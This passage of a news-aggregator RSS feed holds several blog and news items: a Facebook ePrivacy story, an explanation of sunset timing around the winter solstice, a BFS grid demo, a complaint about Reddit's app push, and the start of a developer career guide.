<p>If you need to manage these tools then it's a must to keep track of any changes in preferences. By using this playbook solution we save our configurations in Github. That way we have a backup and we're able to reuse these settings irrespective of any machine we use.</p>
<p>Once you've setup your playbook, it takes approximately 30 minutes to install all the development packages and preferred configuration settings.</p>
<hr>
<p>ğŸ‘‹ <strong>Liked this article?</strong> Follow me on <a target="_blank" href="https://twitter.com/dannysteenman">Twitter</a> to stay updated!</p>
</div></div>]]>
            </description>
            <link>https://dannys.cloud/automatically-setup-macbook-development</link>
            <guid isPermaLink="false">hacker-news-small-sites-25503906</guid>
            <pubDate>Tue, 22 Dec 2020 07:35:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Facebook hit with privacy issues in Europe]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25503513">thread link</a>) | @attainalexander
<br/>
December 21, 2020 | https://www.mytechgist.com/big-tech/facebook-hit-with-privacy-issues-in-europe/ | <a href="https://web.archive.org/web/*/https://www.mytechgist.com/big-tech/facebook-hit-with-privacy-issues-in-europe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_87_5c4">

<div>




<p>Facebook is racing to catch up with privacy laws once again. Facebook privacy issues are nothing new, now the social media giant has temporarily disabled a number of Instagram and Messenger features. This is in order to comply with new directives set to go in place later this month. Facebook is taking steps to make sure the services comply with a change in privacy rules, as messaging apps will fulfill under <a href="https://www.mytechgist.com/big-tech/the-eu-is-about-to-announce-new-rules-for-big-tech/">EU regulations</a> â€“ the ePrivacy directive â€“ from Monday.</p>







<figure><img width="1024" height="683" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20683'%3E%3C/svg%3E" alt="" data-lazy-srcset="https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-1024x683.jpg 1024w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-300x200.jpg 300w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-768x512.jpg 768w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-1536x1024.jpg 1536w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-2048x1365.jpg 2048w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-696x464.jpg 696w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-1068x712.jpg 1068w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-1920x1280.jpg 1920w, https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-630x420.jpg 630w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://www.mytechgist.com/wp-content/uploads/2020/12/pexels-tracy-le-blanc-607812-1024x683.jpg"><figcaption>Photo by&nbsp;<strong><a href="https://www.pexels.com/@tracy-le-blanc-67789?utm_content=attributionCopyText&amp;utm_medium=referral&amp;utm_source=pexels">Tracy Le Blanc</a></strong>&nbsp;from&nbsp;<strong><a href="https://www.pexels.com/photo/apple-applications-apps-cell-phone-607812/?utm_content=attributionCopyText&amp;utm_medium=referral&amp;utm_source=pexels">Pexels</a></strong></figcaption></figure>



<p>There is no specific list of disabled features but here is a short list of the features disabled in the past few days:</p>



<ul><li>Media file sends in Messenger</li><li>Chat nicknames in Messenger</li><li>Polls on Messenger</li><li>Personalized replies in Messenger</li><li>Stickers in Instagram DMs</li><li>Polls in Instagram DMs</li><li>AR effects in Instagram DMs</li></ul>



<h2 id="h-will-these-features-be-back">Will these features be back?</h2>



<p>There is currently no concrete timeline for when these features will return to European users. But Facebook is insistent that the changes are temporary, and should be â€œcoming back very soon.â€</p>



<p>Facebook has stated that its reason for disabling these features is for compliance with the <a href="https://eur-lex.europa.eu/LexUriServ/LexUriServ.do?uri=CONSLEG:2002L0058:20091219:EN:HTML" target="_blank" rel="noreferrer noopener">2002 ePrivacy directive</a> from the European Union. This directive goes into effect on December 21st and outlines a number of strict rules for messaging platforms, like Messenger and Instagram.</p>



<p>More specifically, the ePrivacy directive is concerned with â€œthe processing of personal data and the protection of privacyâ€. Simply put, itâ€™s designed to keep tech companies in check when it comes to how they use the information in your messages and the metadata that comes with them. In a statement, Facebook said: â€œWeâ€™re still determining the best way to bring these features backâ€. It takes time to rebuild products in a way that works seamlessly for people and also comply with the new regulation.â€</p>



<p>In another statement, Facebook said: â€œWeâ€™re still determining the best way to bring these features back. â€œIt takes time to rebuild products in a way that work seamlessly for people and also comply with new regulation.â€</p>



<h2 id="h-conclusion">Conclusion</h2>



<p>Facebook privacy issues are not new, we all remember the <a href="https://en.wikipedia.org/wiki/Facebook%E2%80%93Cambridge_Analytica_data_scandal" target="_blank" rel="noreferrer noopener">Cambridge Analytica</a>, incident where millions of data Facebook usersâ€™ data were acquired with the individualsâ€™ consent. Then social media giant is taking precautionary measures to ensure that the company is safe from legal issues.</p>



<p>However, itâ€™s very likely that Facebook is taking these extra precautions to protect itself as best it can. </p>




</div></div></div>]]>
            </description>
            <link>https://www.mytechgist.com/big-tech/facebook-hit-with-privacy-issues-in-europe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25503513</guid>
            <pubDate>Tue, 22 Dec 2020 06:20:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why aren't the earliest sunset/latest sunrise on the day of the winter solstice?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25503062">thread link</a>) | @fortran77
<br/>
December 21, 2020 | http://larry.denenberg.com/earliest-sunset.html | <a href="https://web.archive.org/web/*/http://larry.denenberg.com/earliest-sunset.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<p><small>
<a href="http://www.larry.denenberg.com/">Larry's home page</a>
</small>
</p>

<h3>
Why aren't the earliest sunset and latest sunrise on the same day as
the winter solstice?
</h3>

<p>The shortest day of the year is the day of the winter solstice, which in
2020 is December 20 or 21 depending on time zone. It seems reasonable that
the latest sunrise and earliest sunset would both occur on the shortest
day.&nbsp; But it's not so; the earliest sunset is a couple of weeks
earlier and the latest sunrise is a couple of weeks later.&nbsp; <a name="back1" href="#note1">[Note&nbsp;1]</a>&nbsp; (The notes contain
additional explanation that can be skipped on first reading.)

</p><p>What explains this peculiarity?&nbsp; Why don't the earliest sunset and
latest sunrise both fall on the shortest day?

</p><p>The time of day when the sun reaches its highest point in the sky is
called <em>solar noon</em>.&nbsp; The length of time from one solar noon to
the next is called the <em>solar day</em>.&nbsp; That is, one solar day is
the time it takes for the sun to return to its highest point in the sky.

</p><p>The length of the solar day varies during the year:&nbsp; Near
the winter and summer solstices the solar day is <em>more</em> than 24
hours long, and near the spring and fall equinoxes it's <em>less</em> than
24 hours long.&nbsp; (Why so?&nbsp;We'll see shortly.)&nbsp;
<!--
So solar noon
rarely occurs exactly at clock noon; it's sometimes before and sometimes
after.&nbsp;
-->
Therefore:&nbsp; <em>near the solstices, solar noon occurs at a slightly
later clock time each day</em> because the solar day is more than 24 hours
and the clock day is always exactly 24 hours.

</p><p>Next: Since solar noon is a little later each day, sunset is also a
little later each day.&nbsp; (This is true because
the time from solar noon to sunset doesn't change very much near the
winter solstice <a name="back2" href="#note2">[Note&nbsp;2]</a>.)&nbsp;
But if sunset is a little later each day, that means
the earliest sunset has already happened!&nbsp; By the same reasoning,
later solar noons at the solstice imply later sunrises, hence sunrise is getting later
and the latest sunrise is yet to occur.&nbsp; [Notes <a name="back3" href="#note3">3</a>, <a name="back4" href="#note4">4</a>]

</p><p>So now we see why a longer-than-average solar day causes both earliest
sunset and latest sunrise to <em>not</em> fall on the solstice. The next
step is to understand why the length of the solar day varies, and in
particular why it is longer at the solstices.

</p><p>There are two factors that change the length of the solar day.&nbsp; The
first is that the earth's axis is tilted with respect to its orbit around
the sun, and the second is that the earth's orbit is not a circle but an
ellipse.&nbsp; The first of these factors, called the <em>obliquity</em> of
the axis, has the larger effect and is the only one we examine
here <a name="back5" href="#note5">[Note&nbsp;5]</a>.&nbsp; So let's study
the length of the solar day assuming that the tilted earth orbits the sun in a
perfect circle.

</p><p>Here's a summary:&nbsp; The length of the solar day is determined mostly
by the rotation of the earth on its axis, but is also affected a little bit
by the revolution of the earth around the sun.&nbsp; The rotation by itself
would create a solar day of constant length whether the axis was tilted or
not.&nbsp; The slight change caused by the revolution would be a constant if
the earth were not tilted, but because of the tilt it is <em>not</em>
constant;&nbsp; this effect varies through the year and makes the
solar day longer near the solstices and shorter near the equinoxes.&nbsp;
Now for the details.&nbsp; [The explanation that follows is based on a
presentation by Andy Latto.]

</p><p>At any instant, there is exactly one point on the earth's surface where
the sun is directly overhead.&nbsp; To find it, draw a line from the center
of the sun to the center of the earth and stand on the point where the line
touches the earth's surface.&nbsp; At that point, and no other, the sun is
exactly overhead.&nbsp; It is solar noon at that point and also everywhere
else at the same longitude.

</p><p>If the earth were motionless with respect to the sun, the
sun-directly-overhead point would always be in the same spot. But the point
moves, both because of the rotation of the earth on its axis and because of
the revolution of the earth around the sun.&nbsp; When the point moves once
around the earth, one solar day has passed.&nbsp;When we say "once
around the earth" we care only about the <em>east-west</em> motion of
the pointâ€”solar noon recurs when the point traverses 360 degrees of
longitude.&nbsp; The <em>north-south</em> motion of the point doesn't
matter to us since it doesn't count in determining whether solar noon has arrived.

</p><p>First let's examine the effect of the earth's rotation.&nbsp; Imagine an
untilted earth not revolving around the sun, just rotating, and it's
obvious that the sun-directly-overhead point moves along the equator, once
around per day.&nbsp; Now mentally tilt the earth's axis
and you'll see that the point follows
some other parallel of latitude, still once around per
day.&nbsp; <a name="back6" href="#note6">[Note 6]</a>&nbsp; Since the point
moves along a parallel of latitude, it moves in a purely east-west
direction, in fact due west.&nbsp; If we measure speed in degrees of
longitude per hour (not in miles per hour!) we realize that the speed of
the point is constant, no matter what latitude it's at; it goes once
around, 360 degrees, each day.

</p><p>The bottom line is that the rotation of the earth causes the
sun-directly-overhead point to move directly west, crossing lines of
longitude at a constant rate.&nbsp; If this were the only factor to
consider, the length of the solar day would be constant regardless of any
tilt.

</p><p>Now we have to add the effect of the earth's revolution around the
sun.&nbsp; Again, start by imagining the earth with untilted axis, this
time not rotating but just revolving around the sun.&nbsp; You'll see the
sun-directly-overhead point moving once around the earth each year.&nbsp;
And (take my word for this) the point moves eastward, so its motion is
<em>contrary</em> to the motion from the rotationâ€”when added in, this
motion makes each solar day a little <em>longer</em> than it would be from
the rotation alone.&nbsp; (But just a very little, since the motion from
the revolution is so much slower.)&nbsp; If the earth were not tilted, the
motion due to revolution would be due east at constant rate, and would
lengthen each day equally throughout the year.

</p><p>But the earth <em>is</em> tilted!&nbsp; So the earth's revolution around
the sun doesn't move the sun-directly-overhead point along the equator, but
rather around a great circle that's tilted with respect to the
equator.&nbsp; Here's the path that the sun-directly-overhead point would
follow if only revolution around the sun was a factor (and also the
constant-latitude path that the sun-directly-overhead point would follow if
we only take into account the earth's rotation): <img src="http://larry.denenberg.com/sdo-point.jpg" alt="Path of the SDO point">

</p><p>Now the crux of the matter: As the sun-directly-overhead point moves
around this great-circle path, it is <em>not</em> moving directly
east.&nbsp; It moves generally east, but sometimes it's travelling a little
northeast and sometimes a little southeast.&nbsp; It moves due east only at
its most northerly and southerly extent, which happens at the solstices.

</p><p>So even though the overall speed of the point is constant,
the <em>eastward component</em> of the speed is not constant, and that's
what we care about:&nbsp; it's fastest when the point is moving due east
(at the solstices), and is smaller when the point is moving north or south
as well as east.&nbsp; The eastward speed is slowest when the point has the
largest northerly or southerly motion, that is, at the equinoxes, when the
point crosses the equator.&nbsp; <a name="back7" href="#note7">[Note&nbsp;7]</a>

</p><p>Hence this once-around-per-year motion of the point, which makes each
day a little longer, has a different effect at different times of the
year.&nbsp; At the solstices the motion is due east, so its eastward motion
is fastest and lengthens the solar day more.&nbsp; That is, at the
solstices, the solar day is longer than its average length.&nbsp; At the
equinoxes, the point is moving northeast or southeast as much as it ever
does, so the eastward component of its speed is at its slowest and has the
least effect at making the day longer.&nbsp; That is, at the equinoxes, the
solar day is a little shorter than average.&nbsp; And we're done.

</p><p>One last comment:&nbsp; If you take a picture of the sun each day when
your clock says noon (<em>not</em> at local solar noon) the sun is not
always in the same place in the sky.&nbsp; It moves east and west because
of the variation in the length of the solar day, and it moves north and
south with the change of the seasons.&nbsp; The combination of these
motions traces out a figure-eight shape called
the <a href="http://www.analemma.com/"><em>analemma</em></a> which you can
see pictured on some globes.

</p><h3><a name="notes">Notes:</a></h3>

<p><a name="note1">[1]</a> The actual dates of earliest sunset and latest
sunrise depend on latitudeâ€”near the equator, the earliest sunset occurs
in November!&nbsp; Solstices and equinoxes happen at the same instant
worldwide.&nbsp; <a href="#back1"><small>back</small></a>

</p><p><a name="note2"></a> 
[2] You might object to this:&nbsp; "The time
between solar noon and sunset isn't constant!" I hear you cry.&nbsp;
"It gets shorter in December and longer in July, making more or less
daylight!"&nbsp; Yes it does, but that change happens <em>very</em>
slowly near the solstices and can be ignored.

</p><p>Think of it this way:&nbsp; There are two factors that change the time
of sunset.&nbsp; The first is the change in the number of hours of
daylightâ€”we get fewer hours of daylight as we move towards December,
which is reflected in earlier sunsets.&nbsp; The second factor is the
difference between solar time and clock time, which we're explaining in
this website (see Note&nbsp;4).&nbsp; The first factor is the dominating factor
through most of the year.&nbsp; Near the summer and winter solstices,
though, the amount of daylight in the day is essentially constant, changing
only a tiny amount from day to day, and the second factor comes into
play.&nbsp; <a href="#back2"><small>back</small></a>

</p><p><a name="note3">[3]</a> We can apply the same reasoning to the summer
solstice to conclude that the <em>latest</em> sunset must <em>follow</em>
the summer solstice, and the <em>earliest</em> sunrise
must <em>precede</em> the summer solstice.&nbsp; Just remember that
<em>at either solstice, both sunrise and sunset are getting later</em> and
you can always tell where the earliest/latest sunrise/sunset occur.
&nbsp; <a href="#back3"><small>back</small></a>

</p><p><a name="note4">[4]</a> Here's another way to look at it:&nbsp; We don't
tell time using the solar day, because we want all days to have exactly the
same length.&nbsp; So we use clocks that run at a constant rate independent
of the sun, ticking off exactly 24&nbsp;hours each day.&nbsp; These clocks
average out the variations in the solar day, making all days the same</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://larry.denenberg.com/earliest-sunset.html">http://larry.denenberg.com/earliest-sunset.html</a></em></p>]]>
            </description>
            <link>http://larry.denenberg.com/earliest-sunset.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25503062</guid>
            <pubDate>Tue, 22 Dec 2020 05:03:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interactive Breadth First Search in a Grid]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25502936">thread link</a>) | @todsacerdoti
<br/>
December 21, 2020 | https://www.henryschmale.org/2020/12/20/bfs-grid-explorer.html | <a href="https://web.archive.org/web/*/https://www.henryschmale.org/2020/12/20/bfs-grid-explorer.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Interactive Breadth First Search in a Grid</p>
    <p>
        2020 December 20
    </p>
</div><div>
    <p><a href="https://en.wikipedia.org/wiki/Breadth-first_search">Breadth first search(BFS)</a> is a very powerful and useful algorithm for
exploring graph like structures. A BFS searches itâ€™s nearest neighbors first
before moving on. Itâ€™s main use is to find a path using
the fewest hops. Here we use it to explore a grid that can be modified
by a user. In this grid, we have verticies (the grid boxes), and edges 
(the box north, south, east and west).</p>

<p>A plain english example would be as</p>

<ol>
  <li>Create a queue with your starting element.</li>
  <li>while the queue is not empty
    <ol>
      <li>shift out the first element.</li>
      <li>does that element meet the goal?
        <ol>
          <li>If so quit with success</li>
        </ol>
      </li>
      <li>Otherwise for all neighbors of that element add them to the queue 
if they havenâ€™t been seen yet. Make a note of where we came from.</li>
    </ol>
  </li>
  <li>Otherwise fail.</li>
</ol>


<ol>
  <li>Change your grid size of anything between 4 and 40 elements wide. 
Hit the reset grid button.</li>
  <li>Set your start point using the â€œplace start pointâ€ button. There must 
be exactly one starting point.</li>
  <li>Place some finish points using the â€œplace finish pointâ€ button. There 
can be many finish points. In a regular BFS these are your target 
points.</li>
  <li>Add some constraints by drawing some walls.</li>
  <li>Hit either â€œRunâ€ or â€œStepâ€ to start the BFS
    <ol>
      <li>The active node will be surounded with a <span>gold</span> border.</li>
      <li>Discovered nodes are surrounded with a <span>dark blue</span> border.</li>
      <li>The nodes in the queue are surrounded with a <span>light blue</span> border.</li>
    </ol>
  </li>
  <li>After the goal is found it will draw the path back to the starting node. It will be shown in
 <span>light green</span></li>
</ol>






<p>You can view and explore the source code on <a href="https://github.com/HSchmale16/TS_BFS_Graph_Explorer">GitHub</a>. Made with
TypeScript because I can.</p>

<!-- todo: refactor BFS_explorer to be an include -->





</div></div>]]>
            </description>
            <link>https://www.henryschmale.org/2020/12/20/bfs-grid-explorer.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502936</guid>
            <pubDate>Tue, 22 Dec 2020 04:44:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[This Community is Available in the App]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 52 (<a href="https://news.ycombinator.com/item?id=25502828">thread link</a>) | @rukshn
<br/>
December 21, 2020 | https://ruky.me/2020/12/22/this-community-is-available-in-the-app/ | <a href="https://web.archive.org/web/*/https://ruky.me/2020/12/22/this-community-is-available-in-the-app/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Yesterdayâ€™s <a href="https://ruky.me/2020/12/21/a-to-do-app-that-fits-in-a-single-tweet/">post</a> was an awesome one, I learned a lot in JavaScript and and I was happy to see people doing what I thought impossible. Writing a simple todo app within 280 chars, in plain js.</p>
<p>After I finished writing the post, I wanted to share it on Reddit JavaScript community, r/javascript at the same time I shared it on HackerNews.</p>
<p>I have seen lot of comments on HackerNews criticizing the new Reddit design, using JavaScript and breaking in their mobile website, and constant nags pushing the users to their mobile app.</p>
<p>I was one of those few who liked their new design on desktop, no page loads between posting something, lot of white spaces, I feel most of the average users would be feeling the same, except for the tech community. But as a service Reddit should be looking at the common denominator, not the outliers.</p>
<p>Iâ€™m annoyed with the mobile app nag, when I visit the mobile website, Reddit is always asking me to download the mobile app. But I just cancel it and move along in the mobile browser.</p>
<p>But what happened yesterday just took me off the ledge. When I visited the r/javascript community on my iPad, I was greeted with this screen.</p>
<figure><img data-attachment-id="73" data-permalink="https://ruky.me/2020/12/22/this-community-is-available-in-the-app/img_0041/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?fit=1536%2C2048&amp;ssl=1" data-orig-size="1536,2048" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_0041" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?fit=225%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?fit=768%2C1024&amp;ssl=1" loading="lazy" width="768" height="1024" src="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=768%2C1024&amp;ssl=1" alt="" srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=768%2C1024&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=225%2C300&amp;ssl=1 225w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=1152%2C1536&amp;ssl=1 1152w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?w=1536&amp;ssl=1 1536w" sizes="(max-width: 768px) 100vw, 768px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=768%2C1024&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=225%2C300&amp;ssl=1 225w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=1152%2C1536&amp;ssl=1 1152w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?w=1536&amp;ssl=1 1536w" data-lazy-src="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=768%2C1024&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>This community is only available in the app.</figcaption></figure>
<p>Why do you block me from from visiting the community from my mobile device?</p>
<p>Will the whole mobile website is scrapped and you end up with a landing page to download the mobile app?</p>
<p><strong>If you want to visit a popular subreddit</strong>, <strong>install our up and use it, or else login. </strong></p>
<p>Iâ€™ve managed to see the subreddit by requesting the desktop website, but Iâ€™m sure they will figure out a way, by checking the screen size to block this as well.</p>
<p>I understand that, as a company, you need to push to gain as much users as possible on their mobile devices, thatâ€™s the best way to track, to send notifications and keep you hooked and keep coming back. If I had a company like Reddit I might have done the same.</p>
<p>But for blocking users from their mobile devices, a service they once offered is a very dark pattern, instead what they should do is introduce some awesome features that will make the users download the app by themselves so they can enjoy those features. Not forcing the app though their throats.</p>
<p>Anyone else experienced a similar experience on Reddit mobile?</p>
<p><em>Only after writing the and checking the screenshot again made me see that they allow you to see the subreddit by logging in. But that is obscured and they intend to push users to download the app.</em></p>
</div></div>]]>
            </description>
            <link>https://ruky.me/2020/12/22/this-community-is-available-in-the-app/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502828</guid>
            <pubDate>Tue, 22 Dec 2020 04:24:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Software Developer's Guide to Career Ownership]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25502812">thread link</a>) | @mooreds
<br/>
December 21, 2020 | https://cult.honeypot.io/reads/developer-career-ownership-guide/ | <a href="https://web.archive.org/web/*/https://cult.honeypot.io/reads/developer-career-ownership-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="Is Your Career Drifting Out To Sea?">Is Your Career Drifting Out To Sea?</h2><p>Like a frog who's slowly being boiled in a pot but doesn't realise it, two years into my career I slowly came to discover that I wasn't progressing anywhere near what I thought I should have.</p><p>I was learning tons and growing in my skills. But it seemed like that didn't matter.</p><p>Failed job interviews, tiny salary increases after delivering on difficult long-term projects, bitterness, etc. were the results.</p><p><b>Have you ever felt the same way as I did? Feel like your quality of work and effort doesn't get the recognition and results you expected?</b></p><p>One year, I was flat-out told that I wouldn't be getting a raise because I had spent some time on parental leave (even though I had delivered on a critical project that year).</p><p>Another time, I failed a job interview due to my poor attitude and bitterness towards a situation which in reality was a very complex project that needed strong ownership, patience and leadership.</p><h2 id="I took ownership of my career">I took ownership of my career</h2><p>Faced with the reality of career progression as a software developer, I decided to make an intentional effort to take ownership of my career.</p><p>What does that mean, you ask?</p><blockquote><p><b>Taking ownership of your career means that you realise your career is an organic thing that you can either nurture and grow, ignore or even damage.</b></p></blockquote><p>It's like a garden: deciding what seeds to plant, where to plant, how to nurture your plants, deciding what plants to sow more of, etc.</p><p>If you are intentional about planting and maintaining your garden then you should get results.</p><p>If you don't maintain your plants then your garden will most likely get grown over with weeds and not do so well!</p><p>And, if you don't plant any seeds yet expect a garden to appear - well, that's kinda crazy.</p><p>Your career is the same! If you simply expect that "doing a good job" will land you promotions or position you as a competitive asset in the job market then it's just like that last analogy of ignoring your garden!</p><h2 id="Does doing good work mean getting recognised?"><b>Does doing good work mean getting recognised?</b></h2><p>For myself, the root falsehood I believed was that <i>doing good work would lead to being recognised.</i></p><p>Sadly, most of the time, that's just not true.</p><p>Our managers are overloaded with their tasks. They are juggling personal issues, internal HR conflicts, overdue projects, etc.</p><p>Is "just doing a good job" going to make you stand-out in their minds? <i>Nope.</i></p><p>This is the biggest piece of advice I give everyone who comes to me with career advice:</p><p><b>You need to simply stand-out.</b></p><p>Whether that's within your company, among other resumes, within the greater developer community, etc.</p><h2 id="Reputation"><b>Reputation</b></h2><h3><b>What is it?</b></h3><p>Reputation just means "how much you stand-out" combined with your overall professional competence.</p><p>Reputation = How much you stand-out + competence.</p><p>Think of your programming "heroes": they are very skilled and competent. <i>Yet</i>, they are constantly putting themselves in public by promoting themselves, sharing their thoughts, sharing their "wins", etc.</p><p>Do you think they have trouble landing new jobs? <i>Nope.</i></p><p>Does that mean you need to become a programming hero to get promoted and land that new job? Not at all.</p><blockquote><p>I'm simply pointing out that self-promotion, helping other people, getting involved in communities, networking with other professionals and building long-lasting relationships are all part of building your reputation.</p></blockquote><p>If you are always helping your manager, discussing your "wins" and asking about how your work has affected the company then you'll ensure that you're top of mind.</p><p>The fact is, most developers hardly talk to their managers about their work and how it's impacting the company.</p><p>Tip: Show an interest in your manager. Make their job easier by doing awesome work. And, ask about how your work is improving the company. <i>One-on-one meetings are a great time to ask about these things.</i></p><h2 id="Questions that others ask about YOU"><b>Questions that others ask about YOU</b></h2><p>Everyone is forming an opinion and view of who you are, how skilled you are, etc.</p><p>Here's a short list to get you thinking about what others are asking themselves about <b>YOU</b>:</p><ul><li><p>Are they kind?</p></li><li><p>Helpful?</p></li><li><p>Intelligent?</p></li><li><p>Do good work?</p></li><li><p>Produce results?</p></li><li><p>Learns quickly?</p></li><li><p>Good at mentoring and teaching others?</p></li></ul><p>Make sure that you can "check" all of those off!</p><p>If you are always complaining and have a poor attitude, then your peers will not see you in a good light.</p><p>On the other hand, if you aren't learning and growing then your peers will see you like a stagnant resource that will, over time, drag down the team!</p><h2 id="Navigating the stages of your career">Navigating the stages of your career</h2><p>Before looking at the specifics of how you can start to grow your reputation and grow in your career, you should get an idea of what general career stage you are at.</p><p>I use a simple framework to layout the common career path stages that most software developers will find themselves in.</p><p>The stages are:</p><ul><li><p>Coder</p></li><li><p>Junior Developer</p></li><li><p>Intermediate Developer</p></li><li><p>Senior Developer</p></li><li><p>Lead Developer</p></li><li><p>Tech Leader</p></li></ul><p>These stages are <b>not job titles.</b> They represent a developer's real experience and competence.</p><p>It's been said that someone with 10 years experience might, in practice, have repeated the same 1 year of experience over-and-over!</p><p>Let's take a look at these stages to get an idea of where you fit and where you might want to go in the future.</p><h3>Coder</h3><p>A coder is a hobbyist.</p><p>If you don't get paid professionally or work with a team of other developers, then you might be a coder.</p><h3>Junior developer</h3><p>A junior developer is entering the IT field as a paid professional and they work with a team of other professionals.</p><p>Are you a junior developer?</p><p>If you've been a professional developer for less than a year (as a very general figure) then you're probably a junior.</p><p>Take a look at the next stage to see if it resonates. If not, then you might still be a junior who's transitioning into becoming an intermediate developer.</p><h3>Intermediate developer</h3><p>An intermediate developer is a competent team member and contributor.</p><p>The telling sign I use for this stage is that <b>intermediate developers usually have a mental urge or "pull" to believe that they know everything they need to know.</b></p><p>Perhaps they feel like their views on how to best architect a system are "complete."</p><p>Perhaps they feel like Javascript is the only programming language they ever need and ever want.</p><p>Whatever it is, there is some degree of feeling like they've "found" the silver bullet or that their current view is finally "the one."</p><blockquote><p><b>The intermediate stage is like stepping into puberty for your career.</b></p></blockquote><p>For example, teens tend to begin believing that they know better than their parents.</p><p>They tend to experiment and be bold about what they believe.</p><p>They begin to tread a path of their own.</p><p>This is the intermediate developer. They are starting to think for themselves.</p><h3>Senior developer</h3><p>The senior developer is becoming very skilled and knowledgeable to the point that those around them are looking to them as a mentor and a "go-to".</p><p>They usually have some specialised or advanced programming knowledge and can build more complex systems using advanced techniques and patterns.</p><p>Seniors are confident in what they know due to their experiences. But they also have a grasp on the fact that there's <i>so much they don't know about.</i></p><p>The biggest telling sign that you are in this stage is whether or not your peers are constantly coming to you for advice and guidance. Are you mentoring others too? These are all signs of being a senior developer.</p><h3>Lead developer</h3><p>The lead developer is focused on providing high-level guidance to their dev team.</p><p>But more importantly, they are a bridge or connector between the development team and the other business-oriented departments in your organisation.</p><p>Are you leading a team of developers? Do you also have to communicate with non-technical managers or other departments about what the development team is working on, etc? If so, you're a lead developer.</p><h3>Tech Leader</h3><p>I hesitate to include this one, but I think it's helpful to see where your career could go in the future.</p><p>A tech leader has made a name for themselves as an expert in some specific area(s) and usually have a very targeted branding/positioning as to what they do well.</p><p>That might be a specific programming language, web security, front-end development with react, a developer mentor, or even a particular industry.</p><p>They could be community builders who have a following of people that look up to them as a direct or indirect mentor.</p><p>They could be thought leaders who champion some specific cause or idea.</p><p>They usually speak publicly about their area of expertise or the ideas that they champion.</p><p>In a nutshell, they are technology experts and very skilled communicators.</p><p>If that sounds like you, then you might be a tech leader.</p><h2 id="How to get to the next stage">How to get to the next stage</h2><p>I've written elsewhere about specific tips to move between each career step. For the moment, I want to highlight some more general pieces of advice that anyone can leverage and use to move forward.</p><h3>Stand-out</h3><p>You need to stand-out within your company if you want to land promotions and be a part of important and growth-inducing projects.</p><p><b>Find a gap within your team or company that could help solve some important problems your company is facing.</b></p><p>Practically speaking, if you are early in your career, just keep an eye out for whenever your peers seem surprised at some skill or way of doing things you have. This might indicate a gap that could be 